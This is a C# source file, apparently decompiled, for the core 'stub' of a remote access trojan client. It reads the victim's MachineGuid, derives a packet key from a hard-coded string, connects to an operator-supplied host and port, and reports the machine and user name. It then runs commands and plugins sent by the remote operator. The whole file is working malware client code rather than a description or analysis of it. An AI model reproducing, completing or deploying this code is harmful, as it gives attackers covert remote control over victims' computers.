using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace stub
{
    class Core
	{
		public static Guid Guid = Guid.Empty;
		public static string Host = null;
		public static ushort Port = 0;
		public static string Group = "Default";
		public static string Version = "1.0";

		public static Dictionary<string, ClientSocket> Clients;
		public static List<PluginInfo> PluginInfos;
		public static ClientSocket Client;
		private static ManualResetEvent manualReset;

		public static ClientNameObjectCollection Variables;
		public static ClientNameObjectCollection ClientSettings;
		public static ClientReadOnlyNameObjectCollection BuilderSettings;

		public static void Run(string host, ushort port)
		{
			string text = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography", "MachineGuid", "");
			if (!string.IsNullOrEmpty(text))
				Guid = new Guid(text);

			manualReset = new ManualResetEvent(false);

			Host = host;
			Port = port;

			MD5CryptoServiceProvider md5Provider = new MD5CryptoServiceProvider();
			var md5 = md5Provider.ComputeHash(Encoding.UTF8.GetBytes("zeroalcatraz8219831EF052"));

			var buf = new byte[8];
			Buffer.BlockCopy(md5, 0, buf, 0, buf.Length);
			Packet.Init(buf);

			Client = new ClientSocket();
			Client.HandleConnect = HandleConnect;
			Client.HandleException = HandleException;
			Client.HandlePacket = HandlePacket;
			Client.Connect(host, port);
		}

		public static void smethod_9()
		{
			Clients = new Dictionary<string, ClientSocket>();
			PluginInfos = new List<PluginInfo>();
			Variables = new ClientNameObjectCollection(new ValueChanged(VariableChanged));
			ClientSettings = new ClientNameObjectCollection(new ValueChanged(ClientSettingChanged));
			BuilderSettings = new ClientReadOnlyNameObjectCollection(new Dictionary<string, object>());
		}

		private  static void VariableChanged(string str)
		{
			if (PluginInfos == null)
				return;

			foreach (PluginInfo pi in PluginInfos)
			{
				if (pi.Plugin != null)
				{
					try
					{
						pi.Plugin.VariableChanged(str);
					}
					catch
					{
					}
				}
			}
		}

		private  static void ClientSettingChanged(string str)
		{
			if (PluginInfos == null)
				return;

			foreach (PluginInfo pi in PluginInfos)
			{
				if (pi.Plugin != null)
				{
					try
					{
						pi.Plugin.ClientSettingChanged(str);
					}
					catch
					{
					}
				}
			}
		}

		public static void HostStateChanged(bool bool_6)
		{
			if (PluginInfos != null)
			{
				foreach (PluginInfo pi in PluginInfos)
				{
					if (pi.Plugin != null)
					{
						try
						{
							pi.Plugin.ConnectionStateChanged(bool_6);
						}
						catch
						{
						}
					}
				}
			}
		}

		private static void HandleConnect(ClientSocket client, bool bool_6)
		{
			if (bool_6)
			{
				PluginClient.SendMessage(Guid, Environment.MachineName + "\\" + Environment.UserName, Group, new Version(Version));
			}
		}

		private static void HandleException(ClientSocket client, Exception ex)
		{
			if (ex is SocketException)
			{
				manualReset.Set();
			}
			Console.WriteLine(ex);
		}

		private static void HandlePacket(ClientSocket client, byte[] bytes)
		{
			PacketData data = Packet.ReadData(bytes);
			switch (data.Type)
			{
				case 0:
					PluginClient.HandleCommand(data);
					break;
				case 1:
					PluginManager.HandleCommand(data);
					break;
				default:
					break;
			}
		}

		public static void SendMessage(ClientSocket client, bool bool_6, CommandType commandType, byte byte_3, object[] obj)
		{
			Guid guid_ = new Guid();
			byte[] buf = Packet.WriteData(bool_6, (byte)commandType, byte_3, guid_, obj);
			client.SendBytes(buf);
		}

		public static void SendMessage(ClientSocket client, bool bool_6, CommandType commandType_0, byte byte_3, Guid guid_0, object[] obj)
		{
			byte[] buf = Packet.WriteData(bool_6, (byte)commandType_0, byte_3, guid_0, obj);
			client.SendBytes(buf);
		}

		public static void Wait()
        {
			manualReset.WaitOne();
        }
	}
}